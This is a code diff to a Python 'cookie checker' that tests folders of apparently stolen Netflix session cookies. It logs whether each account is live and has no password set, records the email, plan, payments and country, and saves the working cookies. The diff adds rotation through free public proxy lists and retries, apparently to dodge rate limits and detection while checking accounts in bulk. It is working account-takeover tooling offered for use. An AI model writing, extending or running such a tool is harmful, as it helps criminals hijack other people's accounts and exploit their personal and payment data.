@@ -45,14 +45,54 @@ def parse_cookie_file(path):
     return email or '?', nfid, snfid, plan, payments, country
 
 
-def check_password_state(nfid, snfid):
+PROXY_SOURCES = [
+    'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt',
+    'https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/protocols/http/data.txt',
+]
+
+
+def fetch_free_proxies():
+    seen = set()
+    proxies = []
+    for url in PROXY_SOURCES:
+        try:
+            r = requests.get(url, timeout=10)
+            for line in r.text.strip().splitlines():
+                line = line.strip()
+                if not line:
+                    continue
+                p = line.replace('http://', '').replace('https://', '')
+                if p not in seen:
+                    seen.add(p)
+                    proxies.append(f'http://{p}')
+        except Exception:
+            pass
+    return proxies
+
+
+class ProxyRotator:
+    def __init__(self, proxies=None):
+        self.proxies = proxies or []
+        self.idx = 0
+
+    def next(self):
+        if not self.proxies:
+            return None
+        p = self.proxies[self.idx % len(self.proxies)]
+        self.idx += 1
+        return p
+
+
+def check_password_state(nfid, snfid, proxy=None):
     s = requests.Session()
+    if proxy:
+        s.proxies = {'http': proxy, 'https': proxy}
     s.cookies.set('NetflixId', nfid, domain='.netflix.com')
     if snfid:
         s.cookies.set('SecureNetflixId', snfid, domain='.netflix.com')
 
     try:
-        r = s.get('https://www.netflix.com/password', headers=HEADERS, timeout=15)
+        r = s.get('https://www.netflix.com/password', headers=HEADERS, timeout=20)
         if r.status_code != 200 or 'login' in r.url.lower():
             return 'DEAD', ''
 
@@ -80,10 +120,31 @@ def progress_bar(current, total, bar_len=30):
 def main():
     banner()
 
-    # ── INPUT ──
-    if len(sys.argv) > 1:
-        COOKIES_DIR = sys.argv[1]
-    else:
+    # ── PARSE ARGS ──
+    args = sys.argv[1:]
+    COOKIES_DIR = None
+    FILTER = None
+    OUTPUT_DIR = None
+    auto_proxy = False
+    proxy_file = None
+
+    i = 0
+    while i < len(args):
+        a = args[i]
+        if a == '--auto-proxy':
+            auto_proxy = True
+        elif a == '--proxy-file' and i + 1 < len(args):
+            proxy_file = args[i + 1]
+            i += 1
+        elif a.startswith('--'):
+            pass
+        elif COOKIES_DIR is None:
+            COOKIES_DIR = a
+        else:
+            FILTER = a
+        i += 1
+
+    if not COOKIES_DIR:
         print(Fore.CYAN + '📁 Enter cookies folder path:' + Style.RESET_ALL)
         COOKIES_DIR = input(Fore.YELLOW + '  > ' + Style.RESET_ALL).strip()
         if not COOKIES_DIR:
@@ -91,10 +152,7 @@ def main():
             sys.exit(1)
 
     PLAN_OPTIONS = {'1': 'Basic', '2': 'Standard', '3': 'Premium'}
-    FILTER = None
-    if len(sys.argv) > 2 and sys.argv[2] != '__all__':
-        FILTER = sys.argv[2]
-    elif not (len(sys.argv) > 2 and sys.argv[2] == '__all__'):
+    if not FILTER:
         print()
         print(Fore.CYAN + 'Select plan to scan:' + Style.RESET_ALL)
         for k, v in PLAN_OPTIONS.items():
@@ -105,14 +163,33 @@ def main():
             FILTER = PLAN_OPTIONS[choice]
 
     BASE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data', 'results-password')
-    if len(sys.argv) > 3:
-        OUTPUT_DIR = sys.argv[3]
-    else:
-        folder_name = os.path.basename(os.path.normpath(COOKIES_DIR))
-        if FILTER:
-            folder_name = FILTER.lower().replace(' ', '-')
-        OUTPUT_DIR = os.path.join(BASE_DIR, folder_name)
+    folder_name = os.path.basename(os.path.normpath(COOKIES_DIR))
+    if FILTER:
+        folder_name = FILTER.lower().replace(' ', '-')
+    OUTPUT_DIR = os.path.join(BASE_DIR, folder_name)
     os.makedirs(OUTPUT_DIR, exist_ok=True)
+
+    # ── PROXY SETUP ──
+    rotator = ProxyRotator()
+    if auto_proxy:
+        print(Fore.CYAN + '\n🌐 Fetching free proxies...' + Style.RESET_ALL)
+        proxies = fetch_free_proxies()
+        if proxies:
+            rotator = ProxyRotator(proxies)
+            print(Fore.GREEN + f'   ✅ Loaded {len(proxies)} proxies' + Style.RESET_ALL)
+        else:
+            print(Fore.YELLOW + '   ⚠ No proxies found, using direct IP' + Style.RESET_ALL)
+    elif proxy_file:
+        if os.path.isfile(proxy_file):
+            with open(proxy_file) as f:
+                proxies = [f'http://{l.strip()}' for l in f if l.strip()]
+            if proxies:
+                rotator = ProxyRotator(proxies)
+                print(Fore.GREEN + f'   ✅ Loaded {len(proxies)} proxies from {proxy_file}' + Style.RESET_ALL)
+            else:
+                print(Fore.YELLOW + '   ⚠ Proxy file empty, using direct IP' + Style.RESET_ALL)
+        else:
+            print(Fore.YELLOW + f'   ⚠ File not found: {proxy_file}, using direct IP' + Style.RESET_ALL)
 
     # ── LOAD FILES ──
     files = sorted(glob.glob(os.path.join(COOKIES_DIR, '*.txt')))
@@ -135,7 +212,7 @@ def main():
     good_cookies_dir = os.path.join(OUTPUT_DIR, 'good_cookies')
     os.makedirs(good_cookies_dir, exist_ok=True)
 
-    stats = {'good': 0, 'bad': 0, 'dead': 0, 'error': 0}
+    stats = {'good': 0, 'bad': 0, 'dead': 0, 'error': 0, 'proxy_switches': 0}
     t0 = time.time()
 
     for i, fpath in enumerate(files):
@@ -147,7 +224,15 @@ def main():
             stats['error'] += 1
             continue
 
-        status, reason = check_password_state(nfid, snfid)
+        proxy = rotator.next()
+        max_retries = 3 if proxy else 1
+        status = reason = None
+        for attempt in range(max_retries):
+            status, reason = check_password_state(nfid, snfid, proxy)
+            if status != 'ERROR':
+                break
+            proxy = rotator.next()
+            stats['proxy_switches'] += 1
 
         label = os.path.basename(fpath).replace('.txt', '')
         line = f'{label} | Email: {email} | Plan: {plan} | Payments: {payments} | Country: {country}'
@@ -185,7 +270,8 @@ def main():
                   f'{Fore.RED}✘{stats["bad"]}{Fore.WHITE}  '
                   f'{Fore.YELLOW}💀{stats["dead"]}{Fore.WHITE}  '
                   f'{Fore.MAGENTA}!{stats["error"]}{Fore.WHITE}  '
-                  f'{rate:.0f}/min  ETA: {remaining:.0f}s' + Style.RESET_ALL, flush=True)
+                  f'{rate:.0f}/min  ETA: {remaining:.0f}s  '
+                  f'{Fore.CYAN}🔄{stats["proxy_switches"]}{Fore.WHITE}' + Style.RESET_ALL, flush=True)
 
     # ── SUMMARY ──
     elapsed = time.time() - t0
@@ -198,6 +284,9 @@ def main():
     print(Fore.YELLOW + f'  💀 DEAD/ERROR        : {stats["dead"] + stats["error"]}' + Style.RESET_ALL)
     print(Fore.WHITE + f'  ⏱ Time              : {elapsed:.0f}s ({elapsed/60:.1f}min)' + Style.RESET_ALL)
     print(Fore.WHITE + f'  ⚡ Rate              : {len(files)/elapsed*60:.0f} accounts/min' + Style.RESET_ALL)
+    if rotator.proxies:
+        print(Fore.CYAN + f'  🔄 Proxy switches     : {stats["proxy_switches"]}' + Style.RESET_ALL)
+        print(Fore.CYAN + f'  🌐 Proxies loaded     : {len(rotator.proxies)}' + Style.RESET_ALL)
     print()
     print(Fore.CYAN + f'  📁 GOOD list : {OUTPUT_DIR}/good_no_password.txt' + Style.RESET_ALL)
     print(Fore.CYAN + f'  📁 GOOD files : {good_cookies_dir}/' + Style.RESET_ALL)
